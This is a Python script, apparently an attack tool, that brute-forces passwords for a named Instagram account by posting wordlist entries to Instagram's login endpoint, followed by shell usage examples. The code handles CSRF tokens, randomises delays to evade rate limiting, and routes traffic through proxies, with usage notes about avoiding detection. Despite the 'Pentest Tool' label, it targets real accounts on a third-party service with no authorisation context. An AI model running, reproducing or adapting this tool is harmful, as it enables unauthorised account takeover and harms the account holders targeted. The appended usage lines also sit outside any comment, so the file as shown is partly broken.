#!/usr/bin/env python3
import requests
import time
import argparse
import sys
from urllib.parse import urljoin
import random

class InstagramBruteForce:
    def __init__(self, username, wordlist_path, delay=2, proxies=None):
        self.username = username
        self.wordlist_path = wordlist_path
        self.delay = delay
        self.proxies = proxies
        self.session = requests.Session()
        
        # Instagram login endpoint
        self.login_url = "https://www.instagram.com/accounts/login/ajax/"
        
        # Set realistic user-agent
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'X-Requested-With': 'XMLHttpRequest',
            'X-CSRFToken': self._get_csrf_token(),
            'Referer': 'https://www.instagram.com/accounts/login/',
            'Origin': 'https://www.instagram.com',
            'Connection': 'keep-alive',
        })
    
    def _get_csrf_token(self):
        """Extract CSRF token from Instagram homepage"""
        try:
            response = self.session.get("https://www.instagram.com/", timeout=10)
            csrf_token = response.cookies.get('csrftoken', 'missing')
            if csrf_token == 'missing':
                # Fallback extraction from response
                import re
                csrf_match = re.search(r'"csrf_token":"(\w+)"', response.text)
                csrf_token = csrf_match.group(1) if csrf_match else 'no_token'
            return csrf_token
        except:
            return 'no_token'
    
    def login_attempt(self, password):
        """Attempt login with given password"""
        payload = {
            'username': self.username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }
        
        try:
            response = self.session.post(
                self.login_url,
                data=payload,
                timeout=10,
                proxies=self.proxies
            )
            
            # Check response indicators
            if 'authenticated":true' in response.text:
                return True, "SUCCESS"
            elif '"two_factor_required":true' in response.text:
                return True, "2FA_ENABLED"
            elif '"checkpoint_required":true' in response.text:
                return False, "CHECKPOINT"
            elif response.status_code == 400:
                return False, "INVALID"
            else:
                return False, "UNKNOWN_ERROR"
                
        except Exception as e:
            return False, f"ERROR: {str(e)}"
    
    def load_wordlist(self):
        """Load passwords from wordlist file"""
        try:
            with open(self.wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[-] Wordlist file not found: {self.wordlist_path}")
            sys.exit(1)
        except Exception as e:
            print(f"[-] Error reading wordlist: {str(e)}")
            sys.exit(1)
    
    def run_bruteforce(self):
        """Main brute force loop"""
        print(f"[+] Starting brute force against: {self.username}")
        print(f"[+] Using wordlist: {self.wordlist_path}")
        print(f"[+] Delay between attempts: {self.delay}s")
        print("-" * 60)
        
        passwords = self.load_wordlist()
        print(f"[+] Loaded {len(passwords)} passwords")
        
        for i, password in enumerate(passwords, 1):
            success, result = self.login_attempt(password)
            
            status = f"[+] [{i}/{len(passwords)}] {password}"
            if success:
                print(f"\n{'='*60}")
                print(f"✅ PASSWORD FOUND: {password}")
                print(f"Status: {result}")
                print(f"{'='*60}\n")
                return True
            else:
                print(f"{status} -> {result}")
            
            # Random delay to avoid rate limiting
            sleep_time = self.delay + random.uniform(0.5, 1.5)
            time.sleep(sleep_time)
        
        print("\n[-] Brute force completed. No valid password found.")
        return False

def main():
    parser = argparse.ArgumentParser(description="Instagram Brute Force Pentest Tool")
    parser.add_argument("username", help="Target Instagram username")
    parser.add_argument("wordlist", help="Path to password wordlist")
    parser.add_argument("-d", "--delay", type=float, default=2.0, help="Delay between attempts (seconds)")
    parser.add_argument("-p", "--proxy", help="Proxy URL (http://127.0.0.1:8080)")
    
    args = parser.parse_args()
    
    # Setup proxies if provided
    proxies = None
    if args.proxy:
        proxies = {
            'http': args.proxy,
            'https': args.proxy
        }
        print(f"[+] Using proxy: {args.proxy}")
    
    # Run the attack
    bf = InstagramBruteForce(args.username, args.wordlist, args.delay, proxies)
    bf.run_bruteforce()

if __name__ == "__main__":
    main() 
    # Basic usage
python instagram_bruteforce.py target_username /path/to/wordlist.txt

# With custom delay (slower to avoid detection)
python instagram_bruteforce.py target_username /path/to/wordlist.txt -d 5

# Through proxy (Burp Suite)
python instagram_bruteforce.py target_username /path/to/wordlist.txt -p http://127.0.0.1:8080
